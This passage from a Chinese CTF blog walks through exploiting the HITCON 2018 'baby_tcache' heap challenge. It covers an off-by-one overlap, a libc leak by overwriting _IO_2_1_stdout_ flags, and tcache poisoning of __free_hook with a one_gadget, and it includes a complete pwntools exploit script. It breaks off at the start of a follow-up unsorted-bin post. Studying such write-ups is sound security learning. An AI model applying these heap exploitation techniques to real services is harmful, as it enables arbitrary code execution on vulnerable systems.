 <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = sub_B27();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  sub_B88((__int64)v3, size);</span><br><span class="line">  v3[size] = <span class="number">0</span>;</span><br><span class="line">  qword_202060[i] = v3;</span><br><span class="line">  v0 = qword_2020C0;</span><br><span class="line">  qword_2020C0[i] = size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点很明显，off-by-one，在堆块重用机制下，会覆盖到下一个堆快的size部分</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>起初自己分析的时候做着做着忘了他没有leak，一股脑构造了个overlap，然后？？？我没有leak咋泄露啊，然后爆炸了，卡了很久都不知道怎么leak<br>看了别人的wp后发觉是利用IO_FILE泄露，以前没有接触过，所以这次记录下</p><h4 id="堆操作初始化"><a href="#堆操作初始化" class="headerlink" title="堆操作初始化"></a>堆操作初始化</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>这个没啥好讲的，每次都得写</p><h4 id="这部分是构造overlap的"><a href="#这部分是构造overlap的" class="headerlink" title="这部分是构造overlap的"></a>这部分是构造overlap的</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>前面学过chunk extend部分，这部分应该很好理解，至于那里为什么是\x60\x06</p><blockquote><blockquote><blockquote><p>hex(0x500+0x30+0x40+0x50+0x60+0x40)<br>‘0x660’</p></blockquote></blockquote></blockquote><p>注意0x500这部分包括chunk的pre_size和size部分</p><p>计算的时候要算上chunk头部大小</p><h4 id="leak-libc-重点"><a href="#leak-libc-重点" class="headerlink" title="leak libc(重点)"></a>leak libc(重点)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x530</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">print(repr(info1))</span><br><span class="line">leak_libc = u64(info1)</span><br><span class="line">io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br></pre></td></tr></table></figure><ol><li>我们要将unsortbin移动到chunk2部分，所以总大小为0x500+0x30+0x10=0x540，所以malloc是0x530</li><li>delete(4)为了后面做准备</li><li>接下来要覆盖的后三位是0x760，这是不会改的，内存一个页是0x1000，后三位是固定的，所以需要爆破高位，我们爆破猜测为0，所以是0x0760，这里是chunk2的数据部分，本来是main_arena的数据的，现在修改他的低两个字节,需要改成<em>IO_2_1_stdout</em></li><li>tcache poisoning攻击</li><li>这里的为什么是fbad1800?以及0x3e大小，还有p64(0)如何来的？</li></ol><p>引用ctf-wiki</p><p>最终会调用到这部分代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)  </span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">      :</span><br><span class="line">      :</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                                <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                                <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p>下面会以_IO_do_write相同的参数调用new_do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)  <span class="comment">/* 需要满足 */</span></span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">     ............</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// 这里真正进行 write</span></span><br></pre></td></tr></table></figure><p>我们目的是调用到_IO_SYSWRITE，所以要bypass前面的检查，结合起来</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure><p>上面这部分ctf-wiki讲过了不在重复叙述，我当初纠结的是puts究竟是如何泄露libc的，<br>我们要用的是_IO_SYSWRITE(fp, data, to_do)<br>这个函数最终对应到函数 write(fp-&gt;fileno, data, to_do)<br>程序执行到这里就会输出 f-&gt;_IO_write_base中的数据，而这些数据里面，就会存在固定的libc中的地址。</p><p>这部分过程建议读读这篇文章，当输出缓冲区还没有满时，会将即将打印的字符串复制到输出缓冲区中，填满输出缓冲区。然后调用_IO_new_file_overflow刷新输出缓冲区</p><p><span class="exturl" data-url="aHR0cDovL2RpdHRvenp6LnRvcC8yMDE5LzA0LzI0L0lPLUZJTEXpg6jliIbmupDnoIHliIbmnpDlj4rliKnnlKgv" title="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/">IO-FILE部分源码分析及利用<i class="fa fa-external-link"></i></span></p><p>所以会泄露出部分数据，逆着推导我们需要执行到这个函数，就需要bypass前面的检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                              <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                              <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">           f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p>这里我们将_IO_write_base最低覆盖成0了，所以他大部分情况下比_IO_write_ptr小，所以to_do的大小就变成相对可控了</p><p>在逆向回去就是flag检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"></span><br><span class="line">_flags = <span class="number">0xfbad0000</span>	<span class="comment">//高两个字节是magic不用管</span></span><br><span class="line">_flags &amp; = _IO_NO_WRITES = <span class="number">0</span></span><br><span class="line">_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">所以_flag的值为<span class="number">0x0</span>xfbad18*<span class="number">0</span>  *可以为任何数</span><br></pre></td></tr></table></figure><p>其实魔数部分改成什么都可以</p><p>原理讲通后就是测试了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里就是覆盖_IO_FILE的结构体了，fbad1800是flags，fbad是魔数，<br>后面接下来三个p64(0)覆盖</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br></pre></td></tr></table></figure><p>最后覆盖一个低字节\x00到_IO_write_base，效果如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x7f00898f0760</span><br><span class="line">0x7f00898f0760 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad1800	0x0000000000000000</span><br><span class="line">0x7f00898f0770 &lt;_IO_2_1_stdout_+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0780 &lt;_IO_2_1_stdout_+32&gt;:	0x00007f00898f0700	0x00007f00898f07e3</span><br><span class="line">0x7f00898f0790 &lt;_IO_2_1_stdout_+48&gt;:	0x00007f00898f07e3	0x00007f00898f07e3</span><br><span class="line">0x7f00898f07a0 &lt;_IO_2_1_stdout_+64&gt;:	0x00007f00898f07e4	0x0000000000000000</span><br><span class="line">0x7f00898f07b0 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f07c0 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007f00898efa00</span><br><span class="line">0x7f00898f07d0 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff</span><br><span class="line">0x7f00898f07e0 &lt;_IO_2_1_stdout_+128&gt;:	0x000000000a000000	0x00007f00898f18c0</span><br><span class="line">0x7f00898f07f0 &lt;_IO_2_1_stdout_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">gdb-peda$ x/10gx 0x00007f00898f0700</span><br><span class="line">0x7f00898f0700 &lt;_IO_2_1_stderr_+128&gt;:	0x0000000000000000	0x00007f00898f18b0</span><br><span class="line">0x7f00898f0710 &lt;_IO_2_1_stderr_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7f00898f0720 &lt;_IO_2_1_stderr_+160&gt;:	0x00007f00898ef780	0x0000000000000000</span><br><span class="line">0x7f00898f0730 &lt;_IO_2_1_stderr_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0740 &lt;_IO_2_1_stderr_+192&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>所以可以泄露出libc地址了</p><h4 id="tcache-poisoning攻击"><a href="#tcache-poisoning攻击" class="headerlink" title="tcache poisoning攻击"></a>tcache poisoning攻击</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">    new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">    new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    new(<span class="number">0x530</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">    new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">    new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">    print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">    info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">    print(repr(info1))</span><br><span class="line">    leak_libc = u64(info1)</span><br><span class="line">    io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br><span class="line">    new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">    one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">'./baby_tcache'</span>)</span><br></pre></td></tr></table></figure><h3 id="调试总结"><a href="#调试总结" class="headerlink" title="调试总结"></a>调试总结</h3><p>这些都是自己调试出来的经验，所以个人技巧，不喜欢可以不用</p><h4 id="查看内存部分"><a href="#查看内存部分" class="headerlink" title="查看内存部分"></a>查看内存部分</h4><p>想gdb调试查看这部分内存的话<br>new(0x3e, p64(0xfbad1800)+ p64(0)*3 + ‘\x00’)，<br>不要在之后下断，之后查看的话看不到<br>可以在这句话之前下断</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b malloc</span><br><span class="line">finish</span><br><span class="line">n</span><br></pre></td></tr></table></figure><p>n有好多步，自己测试，这里可以一直按回车，gdb会默认上一条命令，记得查看那时候内存就行x/20gx stdout</p><h4 id="gdb附加技巧"><a href="#gdb附加技巧" class="headerlink" title="gdb附加技巧"></a>gdb附加技巧</h4><p>这道题需要爆破，所以附加的不好很麻烦，我是加了个死循环，然后gdb.attach(io)，想要中断的时候在运行exp代码那个终端ctrl+c中断后在关闭gdb附加窗口</p><h4 id="计算技巧"><a href="#计算技巧" class="headerlink" title="计算技巧"></a>计算技巧</h4><p>以前我经常用python计算offset，现在都是用gdb命令p addr1-addr2</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>IO_FILE攻击还是nb,能利用基本函数泄露出libc</li><li>自己构造起overlap起来还是有点吃力，以后要多练习这部分内容</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdGNhY2hlX2F0dGFjay16aC8=" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/">ctf-wiki<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL2RpdHRvenp6LnRvcC8yMDE5LzA0LzI0L0lPLUZJTEXpg6jliIbmupDnoIHliIbmnpDlj4rliKnnlKgv" title="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/">IO-FILE部分源码分析及利用<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL3BvbGx1eC5jYy8yMDE5LzA1LzAzLzIwMTgtaGl0Y29uLWJhYnktdGNhY2hlLw==" title="http://pollux.cc/2019/05/03/2018-hitcon-baby-tcache/">2018-hitcon-baby-tcache_writeup<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/63c0a3ee/">https://noone-hub.github.io/posts/63c0a3ee/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程7</title>
    <url>/posts/f37fbe7f/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程7"><a href="#pwn堆入门系列教程7" class="headerlink" title="pwn堆入门系列教程7"></a>pwn堆入门系列教程7</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQwNg==" title="https://xz.aliyun.com/t/6406">pwn堆入门系列教程6<i class="fa fa-external-link"></i></span></p><p>先学习 Unsorted Bin Attack，这部分由于ctf-wiki题目较少，所以只练习了一道题<br>Large bin也没有题目，到时候遇到在进行学习</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="hitcontraining-lab14"><a href="#hitcontraining-lab14" class="headerlink" title="hitcontraining_lab14"></a>hitcontraining_lab14</h2><p>这个题过程也比较简单，自己复现下就好</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>因为现在都是tcache了，所以复现起来还是得拿老版本libc测试</p><p>这里可以看出bk已经被修改</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x9ce0d0-0xd0</span><br><span class="line">0x9ce000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x9ce010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x9ce020:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x9ce030:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x9ce040:	0x0000000a61646164	0x00000000006020b0</span><br><span class="line">0x9ce050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0c0:	0x0000000000000090	0x0000000000000031</span><br><span class="line">0x9ce0d0:	0x0000000a33333333	0x0000000000000000</span><br><span class="line">0x9ce0e0:	